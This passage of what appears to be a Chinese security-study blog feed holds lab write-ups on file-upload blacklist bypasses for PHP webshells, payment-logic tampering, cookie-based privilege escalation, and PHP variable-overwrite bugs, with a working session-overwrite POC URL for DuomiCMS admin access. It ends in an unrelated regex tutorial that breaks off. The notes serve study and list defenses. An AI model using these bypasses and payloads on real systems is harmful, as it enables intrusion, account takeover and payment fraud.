src="https://m.qpic.cn/psb?/V133mrMy3dol57/m1IqTO83xMSNLK8m2qvEU8CwZUTsqPY3GoAIPB1aFdY!/b/dL8AAAAAAAAA&amp;bo=CQWAAmAFqwIRCXw!&amp;rf=viewer_4" alt><br>这里是少了一个删除末尾的点的函数</p><p>我们还是进行将带有一句话的php文件上传并抓包</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/qiENQR89aUzEeuVUhohrosTDte9YlnwFnZr1bGrfjko!/b/dL8AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt><br>在后缀加个点，上传，在上传到服务器后，服务器会自动将点去掉，只读取前面有用的后缀；<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/synsgTwLVgNk6k9.rkhjouhz5iuujzkRNdYZALQkaCg!/b/dDcBAAAAAAAA&amp;bo=gAfbA4AH2wMRCT4!&amp;rf=viewer_4" alt></p><h2 id="8-DATA（Windows文件流绕过）"><a href="#8-DATA（Windows文件流绕过）" class="headerlink" title="8.::$DATA（Windows文件流绕过）"></a>8.::$DATA（Windows文件流绕过）</h2><p>::$DATA（Windows文件流绕过）（这里利用到了NTFS交换数据流(ADS)，ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都存在许多个数据流。通俗理解，就是其他文件可以“寄宿”在某个文件身上，而在资源管理器中却只能看到宿主文件，找不到寄宿问文件。）</p><p>例如在cmd命令下运行：echo abcd&gt;&gt;a.txt:b.txt 很明显生成一个a.txt，但是会是空值，因为系统将值写到寄宿文件上去了；</p><p>然后再运行 echo 123&gt;&gt;a.txt::$DATA，是会在a.txt中输出123的，因为<br>::$DATA相当是个空值，不是一个寄宿文件，所以还是会将文件写入到a.txt中去，不修改文件存储过程；</p><p>在利用Windows特性，可在后缀加上“ ::$DATA ”绕过。<br>跟之前一样的思路，抓包改包绕过。<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ZxgolmKjvTPXMgVANvNagukSCz3aQqzZw.zzqXbcpS4!/b/dEgBAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt></p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/.jYmXUYDdeLg0syadDStJOYrClaPTtwNCJ92IdU5zYs!/b/dLYAAAAAAAAA&amp;bo=fgfSA34H0gMRCT4!&amp;rf=viewer_4" alt></p><h2 id="9-构造文件后缀绕过"><a href="#9-构造文件后缀绕过" class="headerlink" title="9.构造文件后缀绕过"></a>9.构造文件后缀绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/u0nPUSpkCll3GfBBIDmRopaaxgVdUrxPl0kX1o15lXo!/b/dMAAAAAAAAAA&amp;bo=awXNAmsFzQIRCT4!&amp;rf=viewer_4" alt><br>第九关好像用了我们前面关卡的所有过滤，那我们可不可以构造一个文件名后缀111.php. . 过滤参数在发现.时会将.去掉，在将空格去掉，最后只剩下111.php. 这样还是可以绕过黑名单机制的，因为111.php.不等于111.php，所以还是能绕过上传；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/b3gpzQ8zgA4BwI3BdF4*1rxQ4lONy3af9pXegTyO3Gg!/b/dLgAAAAAAAAA&amp;bo=8ATgA*AE4AMRGS4!&amp;rf=viewer_4" alt></p><h2 id="10双写文件后缀绕过"><a href="#10双写文件后缀绕过" class="headerlink" title="10双写文件后缀绕过"></a>10双写文件后缀绕过</h2><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ypZhRcfDvAhSB.SfJLlAWG2DK8tmHOECM2ZWrfGyWtU!/b/dIQAAAAAAAAA&amp;bo=agUEAmoFBAIRCT4!&amp;rf=viewer_4" alt></p><p>会将符合条件的文件后缀删除，我们只需要将文件后缀进行双写，令他删除后合并就能成功绕过！</p><p><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/4OigHcJUMtz6dSWTiGju0oMns0AxY1eM0u*O.o.QG7E!/b/dL8AAAAAAAAA&amp;bo=8ATgA*AE4AMRCT4!&amp;rf=viewer_4" alt><br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/LG5JK1ZorQZBrglBO1UAbGKez.B5lgA3DPErpWLP77M!/b/dDcBAAAAAAAA&amp;bo=cgfWA3IH1gMRCT4!&amp;rf=viewer_4" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>支付漏洞</title>
      <link href="/2019/12/07/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="快捷支付原理"><a href="#快捷支付原理" class="headerlink" title="快捷支付原理"></a>快捷支付原理</h2><p>商户网站接入支付结果有两种方式，一种是通过浏览器进行跳转通知，一种是服务器端异步通知</p><h3 id="浏览器跳转"><a href="#浏览器跳转" class="headerlink" title="浏览器跳转"></a>浏览器跳转</h3><p>基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知，导致支付结果难以处理。而且浏览器端数据很容易被篡改而降低安全性</p><h3 id="服务端异步通知"><a href="#服务端异步通知" class="headerlink" title="服务端异步通知"></a>服务端异步通知</h3><p>该方式是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用post或get的方式。商户网站接受异步参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额，订单信息是否与发起支付时一致，验证正常则对定单进行状态处理或为用户进行网站内入账等。</p><p>该漏洞属于逻辑漏洞的一种，需要靠不一样的思维，来进行逻辑绕过。</p><p>##常见支付漏洞<br>支付步骤：————订购、订单、付款</p><p>三个步骤当中的随便一个步骤进行修改价格测试，如果前面两步有验证机制，那么你可以在最后一步富矿石进行抓包尝试修改金额，如果没有在最后一步做好检验，那么问题就会存在，其修改的金额值你可以尝试小数目或者尝试负数。</p><ul><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0112258.html" target="_blank" rel="noopener">修改支付金额案例</a></p></li><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0102292.html" target="_blank" rel="noopener">修改支付状态案例</a></p></li><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0108134.html" target="_blank" rel="noopener">修改订单数量案例</a></p></li><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0139556.html" target="_blank" rel="noopener">修改附属值案例</a></p></li></ul><p>优惠券其基本都是优惠一半，一般用优惠券进行消费一般出现在第二个步骤当中：确认购买信息，在这个步骤页面当中，你可以选择相关优惠劵，然后直接修改金额大于或等于商品价格就可以，或者直接修改其为负值进行尝试，最后进行支付，如果对这点没有加以验证，那么问题就会产生，直接支付成功</p><p>越权支付<br>存在user=id(123)，这种传参时，尝试改id，尝试用别人的钱包买自己的物品</p><p><a href="http://www.anquan.us/static/bugs/wooyun-2016-0188155.html" target="_blank" rel="noopener">无限制试用案例</a><br>比如试用的参数为2，正常购买的参数为1<br>那么我们购买参数为2(试用)，会发生什么呢？</p><h2 id="支付漏洞-挖掘"><a href="#支付漏洞-挖掘" class="headerlink" title="支付漏洞(挖掘)"></a>支付漏洞(挖掘)</h2><ul><li><strong>找到关键的数据包</strong><br>可能支付操作有三四个数据包，我们要对数据进行挑选。</li><li><strong>分析数据包</strong><br>支付数据包中会包含很多的敏感信息(账号，金额，余额，优惠)，要擦尝试对数据包中的各个参数进行分析</li><li><strong>不按套路出牌</strong><br>多去想想开发想不到的地方<br>pc端尝试过，wap端也看看，app也试试</li></ul><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>1、后端检查每一项值，包括支付状态。</p><p>2、校验价格、数量参数，比如产品数量只能为整数，并限制购买数量</p><p>3、与第三方支付平台检查，实际支付的金额是否与订单一致。</p><p>4、对支付参数进行MD5加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题</p><p>5、金额超过一定值，进行人工审核</p><p>6、限制用户对商品的支付次数</p><h2 id="靶场实践"><a href="#靶场实践" class="headerlink" title="靶场实践"></a>靶场实践</h2><p>找到了一个很辣眼睛的CMS<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uujelhkej31h90p8gud.jpg" alt><br>我们先进行注册用户<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uujv998nj31h90ilwkt.jpg" alt><br>我们点击商品中心<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uuk97z1bj31hc0oa10b.jpg" alt><br>发现他的购买数量没进行限制，还可以填入负数，这就连传包的力气都省… 那我们填入-10000试试<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uukm40dfj31ha0o9qa7.jpg" alt><br>提交<br> 发现报错<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uullzk2dj31gt0q0q5j.jpg" alt><br>我们先不管，先返回看看<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g3uul2tmojj31hc0nuq9d.jpg" alt><br>我们发现我账户余额多了92000块</p><hr><p>我搜到一篇文章，我觉得总结的挺好的，推荐一下：<a href="https://secpulse.com/archives/67080.html" target="_blank" rel="noopener">挖洞技巧：支付漏洞之总结</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>平行越权、垂直越权</title>
      <link href="/2019/12/07/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E3%80%81%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/"/>
      <url>/2019/12/07/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E3%80%81%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="越权漏洞描述"><a href="#越权漏洞描述" class="headerlink" title="越权漏洞描述"></a>越权漏洞描述</h2><p>越权访问，这类漏洞是指应用在检查授权(Authorization)时存在纰漏，使得攻击者在获得低权限用户帐后后，可以利用一些方式绕过权限检查，访问或者操作到原本无权访问的高权限功能。在实际的代码安全审查中，这类漏洞往往很难通过工具进行自动化检测，因此在实际应用中危害很大。其与未授权访问有一定差别。目前存在着两种越权操作类型：横向越权操作(平行越权)和纵向越权操作(垂直越权)。</p><ul><li><strong>水平越权漏洞</strong>，是一种“基于数据的访问控制”设计缺陷引起的漏洞。由于服务器端在接收到请求数据进行操作时没有判断数据的所属人而导致的越权数据访问漏洞。如服务器端从客户端提交的request参数(用户能够控制的数据)中获取用户id，恶意攻击者通过变换请求ID的值，查看或修改不属于本人的数据。</li><li><strong>垂直越权漏洞</strong>，也称为权限提升，是一种“基于URL的访问控制”设计缺陷引起的漏洞。由于Web应用程序没有做权限控制或者仅在菜单上做了权限控制，导致恶意用户只要猜测其他管理页面的URL，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn5h46bnj30ty0fggno.jpg" alt></li></ul><p>我们可以这么说<strong>把握住传参就能把握住逻辑漏洞的命脉</strong>，其实渗透测试也是同一道理，漏洞是不会无缘无故产生。</p><h3 id="越权思路"><a href="#越权思路" class="headerlink" title="越权思路"></a>越权思路</h3><p>登入用户A，正常更改或者是查看A用户信息，然后抓取数据包，将传参ID修改为其他用户，如果成功查看或者修改了同权限其他用户的信息就属于水平越权测试(当然如果可以影响到更高权限的用户就是垂直越权漏洞)</p><p>传参ID参数需要自己检测(常见：uid= id= user= 等)通常使用brup进行爆破传参(传参可能在GET POST COOKIE中)</p><p>常见的平行越权(不需要输入原密码的修改密码，抓包该改用户或者用户ID修改他人密码)进行查看订单信息，遍历订单id等。</p><h3 id="越权漏洞实例与类型"><a href="#越权漏洞实例与类型" class="headerlink" title="越权漏洞实例与类型"></a>越权漏洞实例与类型</h3><ol><li>通过修改GET传参来越权<a href="http://www.anquan.us/static/bugs/wooyun-2016-0205340.html" target="_blank" rel="noopener">GET越权实例</a></li><li>修改POST传参进行越权<a href="http://www.anquan.us/static/bugs/wooyun-2016-0207583.html" target="_blank" rel="noopener">POST越权实例</a></li><li>修改cookie传参进行越权<a href="http://www.anquan.us/static/bugs/wooyun-2016-0184633.html" target="_blank" rel="noopener">COOKIE越权实例</a></li></ol><p>还有一类叫做<strong>未授权访问</strong>，严格意义上而言这个不属于越权漏洞，但是在日常的测试中常常会遇见</p><p>(只要<strong>输入正确对应身份的网址就可以直接访问</strong>，例如/admin默认是登录，登陆后跳转到user.php然后直接访问user.php，发现你直接有后台权限)</p><h2 id="靶场实际"><a href="#靶场实际" class="headerlink" title="靶场实际"></a>靶场实际</h2><p>靶场是一个很老的保修系统，虽然很老，但是还是有些网站还在使用(BWSsoft维修系统)<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn66xuz7j31h80pydo1.jpg" alt="2"><br>我们想要去做一个越权，那我们需要先有一个普通用户的使用权限，我们看到了注册按钮，于是我们进行了注册，获得了一个普通用户身份。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn6kpdp3j31hc0p2dnr.jpg" alt="3"><br>我们点击物品保修，并抓个包看看。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3snle4qokj30z40rkabo.jpg" alt="4"><br>我们发现cookie中存在登陆用户的信息传参，那我们是否能对其数据更改进行越权<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn7bm6blj31a00mt0vp.jpg" alt="5"><br>我们看到admin=0，那管理员的admin传参是不是要等于1呢，我改了一下，但是没用，后面我看到了一个shenfen的传参，两个一起修改才有效呢，管理员的参数值一般为1(true)，那我们试一下。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn7p34boj30v80oswhs.jpg" alt="6"><br>发现改完以后出现了后台管理的按钮<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn84pl6pj31hc0q2wmh.jpg" alt="7"><br>我们点击进去<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sn8f7fi1j31hc0hltak.jpg" alt="8"><br>发现成功进去后台。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>变量覆盖</title>
      <link href="/2019/12/07/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"/>
      <url>/2019/12/07/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/</url>
      
        <content type="html"><![CDATA[<h2 id="变量覆盖介绍"><a href="#变量覆盖介绍" class="headerlink" title="变量覆盖介绍"></a>变量覆盖介绍</h2><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值，一般变量覆盖漏洞需要结合程序的其它功能来实现完整的攻击；变量覆盖漏洞有时候可以直接让我们获取Webshell，拿到服务器权限； </p><p>经常导致变量覆盖漏洞场景有：<strong>$$，extract()函数，parse_str()函数，import_request_variables()使用不当，开启了全局变量注册等。</strong></p><h2 id="变量覆盖函数解析"><a href="#变量覆盖函数解析" class="headerlink" title="变量覆盖函数解析"></a>变量覆盖函数解析</h2><h3 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h3><p>extract() 函数从数组中将变量导入到当前的符号表。<strong>该函数使用数组键名作为变量名，使用数组键值作为变量值。</strong>针对数组中的每个元素，将在当前符号表中创建对应的一个变量。具体函数介绍：<a href="http://www.w3school.com.cn/php/func_array_extract.asp" title="具体函数介绍" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_array_extract.asp</a></p><p><strong>示例一：</strong></p><p>将键值 “Cat”、”Dog” 和 “Horse” 赋值给变量 $a、$b 和 $c：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;Original&quot;;</span><br><span class="line">$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array);</span><br><span class="line">echo &quot;\$a = $a; \$b = $b; \$c = $c&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">//运行结果：$a = Cat; $b = Dog; $c = Horse</span><br></pre></td></tr></table></figure></p><p>成功将变量a覆盖</p><p><strong>示例二：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id=1;  </span><br><span class="line">extract($_GET);</span><br><span class="line">echo $id;</span><br><span class="line">?&gt;</span><br><span class="line">//提交：?id=123</span><br><span class="line">//结果： 123</span><br></pre></td></tr></table></figure><p>成功将变量id覆盖:</p><p><strong>extract()函数防御:</strong></p><p><strong>在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖  extract($_GET,EXTR_SKIP);</strong></p><h3 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str()变量覆盖"></a>parse_str()变量覆盖</h3><p>parse_str() 函数把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。用法参考：<a href="http://www.w3school.com.cn/php/func_string_parse_str.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_parse_str.asp</a></p><p><strong>示例一：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">parse_str(&quot;name=allblue&amp;age=18&quot;);</span><br><span class="line">echo $name  //输出allblue</span><br><span class="line">echo $age   //输出18</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><strong>parse_str()函数防御:</strong><br>只能在传参前添加判断语句，判断变量是否存在；</p><p>tips：parse_str()类似的函数还有mb_parse_str()，用法基本一致。</p><h3 id="导致变量覆盖问题"><a href="#导致变量覆盖问题" class="headerlink" title="$$导致变量覆盖问题"></a>$$导致变量覆盖问题</h3><p>使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?id=2 会将$id的值覆盖，$id=2。</p><p><strong>示例一：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a=1;</span><br><span class="line">foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $request)&#123;</span><br><span class="line">foreach ($$_request as $_key=&gt;$_value)</span><br><span class="line">&#123;$$_key=addslashes($_value);&#125;&#125;</span><br><span class="line">echo $a;     //通过传入参数实现变量覆盖</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="import-request-variables变量覆盖"><a href="#import-request-variables变量覆盖" class="headerlink" title="import_request_variables变量覆盖"></a>import_request_variables变量覆盖</h3><p>import_request_variables 函数可以在 register_global = off 时，把 GET/POST/Cookie 变量导入全局作用域中。</p><p>import_request_variables ( string $types , string $prefix )</p><p>将 GET／POST／Cookie 变量导入到全局作用域中, types 参数指定需要导入的变量, G代表GET，P代表POST，C代表COOKIE.</p><p><strong>示例一：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;    </span><br><span class="line">import_request_variables(&apos;GP&apos;);   </span><br><span class="line">print_r($a);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>此页面当使用GET或POST传递$a变量时，会将原变量的值覆盖。</p><p>值得注意的是：此函数只能用在 PHP4.1 ~ PHP5.4之间。<br>此函数是非常危险的函数，在PHP5.5之后已被官方删除，假如你任然在使用低版本的PHP环境，也建议你避免使用此函数。</p><p>###全局变量覆盖<br>register_globals的意思就是注册为全局变量，所以当On的时候，传递过来的值会被直接的注册为全局变量直接使用，而Off的时候，我们需要到特定的数组里去得到它。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">//?id=1</span><br><span class="line">echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; </span><br><span class="line">echo &apos;$_GET[&quot;id&quot;] :&apos;.$_GET[&apos;id&apos;].&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &apos;$id :&apos;.$id;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>当register_globals=Off的时候，下一个程序接收的时候应该用$_GET[‘id’]来接受传递过来的值；</p><p>当register_globals=On的时候，下一个程序可以直接使用$id来接受值,也可以用$_GET[‘id’]来接受传递过来的值。</p><p>tips：如果上面的代码中，已经对变量$id赋了初始值，比如$id=0，那么即使在URL中有/test.php?id=1，也不会将变量覆盖，id值为0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; </span><br><span class="line">if (ini_get(&apos;register_globals&apos;)) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;);  </span><br><span class="line">print $a.&quot;&lt;br/&gt;&quot;;  </span><br><span class="line">print $_GET[b];  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在register_globals=ON时,</p><p>提交/test.php?a=1&amp;b=2 , 变量$a未初始化,$_GET[b]=2</p><p>提交/test.php??GLOBALS[a]=1&amp;b=2,$a=1,$_GET[b]=2</p><p>tips:　从 PHP » 4.2.0 版开始配置文件中 PHP 指令 register_globals 的默认值从 on 改为 off 了,自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除</p><h2 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h2><p>靶场环境：Duomicmsx2.0；<br>审计工具：seay源码审计系统；<br>因为我们做的是变量覆盖的题目，所有我们先在seay源码审计系统加上一条匹配$$的正则匹配规则:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([^\$&quot;]|$)\$\&#123;?\$</span><br></pre></td></tr></table></figure></p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd18kavzj31970nqwja.jpg" alt></p><p>通过审计工具的自动审计功能来审计可能存在的漏洞：</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd1kgorfj31hc0smtlz.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd1y1tssj31az0myajn.jpg" alt><br>最后寻找，发现了foreach和$$结合的变量覆盖漏洞</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd29fa65j319j0pyaga.jpg" alt></p><p>找到了文件覆盖，但是我们需要找到可以调用覆盖的地方，我们先搜索包含commond.php的文件，看看能不能在其关联的文件中找到可利用代码</p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd2k0sthj31ap0qwwl5.jpg" alt><br>最后我们找到一个包含了common.php和check.admin.php的文件login.php</p><p>我们发现check.admin.php是通过获取用户登录时的id来判断用户的权限，是不是管理员<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd2vgj7aj31gw0sewo8.jpg" alt></p><p>而在admin.manager.php有一个判断，直接根据判断传进来的$groupid来进行身份验证。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd34m68bj31hc0smqb6.jpg" alt></p><p>如果传进来的session值为1，那么就是管理员的权限</p><p>通过构造POC使得duomi_group_id=1,就可以登录系统管理员，POC如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface/comment.php?_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_id]=1&amp;_SESSION[duomi_admin_name]=admin</span><br></pre></td></tr></table></figure><p>我们进去后台登录界面<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3da67rj31hc0pv40b.jpg" alt><br>后台没有管路员密码登录不上<br>插入我们构造的POC：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3nw2muj31hb0r80u8.jpg" alt><br>插入成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3gd3vn3gej31hc0pm76u.jpg" alt><br>进入后台页面，发现没密码，自动成功登录。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2019/12/07/zhengzebiaodashi/"/>
      <url>/2019/12/07/zhengzebiaodashi/</url>
      
        <content type="html"><![CDATA[<p>正则表达式（类似查找文件）(Regular Expression)是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为”元字符”）<br>正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以<code>用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等</code>。</p><h2 id="正则函数"><a href="#正则函数" class="headerlink" title="正则函数"></a>正则函数</h2><ul><li><strong>preg_match ( string $pattern , string $subject ,  [array &amp;$matches] )</strong></li></ul><p>pattern：要搜索的模式，字符串类型，正则表达式 。</p><p>subject：输入字符串。 </p><p>matches：可选，存储匹配结果的数组。</p><p>作用是：执行一个正则表达式匹配，成功返回 1 ，否则返回 0</p><ul><li><p><strong>preg_replace<br>(正则，替换的字符串，匹配的字符串）</strong><br>将所有的匹配正则的字符串进行替换；</p><p><code>通常可以用来过滤敏感字符</code></p><ul><li><strong>preg_match_grep()</strong><br>匹配一个匹配正则的子字符数组，包含匹配的字符串</li></ul></li></ul><ul><li><strong>preg_match_all(正则，匹配的字符串，输出的二维数组</strong><h1 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h1></li></ul><hr><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。<br>正则表达式的限定符有：</p><p>正则表达式的限定符有：</p><h3 id="字符描述"><a href="#字符描述" class="headerlink" title="字符描述:"></a>字符描述:</h3><p> *匹配前面的子表达式零次或多次。例如，zo<em> 能匹配 “z” 以及 “zoo”。</em> 等价于{0,}。</p><p> + 匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</p><p>?    匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</p><p>{n}    n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</p><p>{n,}    n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</p><p>{n,m}    m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</p><h1 id="总结元字符："><a href="#总结元字符：" class="headerlink" title="总结元字符："></a>总结元字符：</h1><hr><p>\<br>将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，’n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\‘ 匹配 “\” 而 “(“ 则匹配 “(“。</p><p>^<br>匹配输入字符串的开始位置。</p><p>$<br>匹配输入字符串的结束位置。</p><p>*<br>匹配前面的子表达式零次或多次。</p><p>+<br>匹配前面的子表达式一次或多次。<br>?<br>匹配前面的子表达式零次或一次。</p><p>{n}<br>n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</p><p>{n,}<br>n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</p><p>{n,m}<br>m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 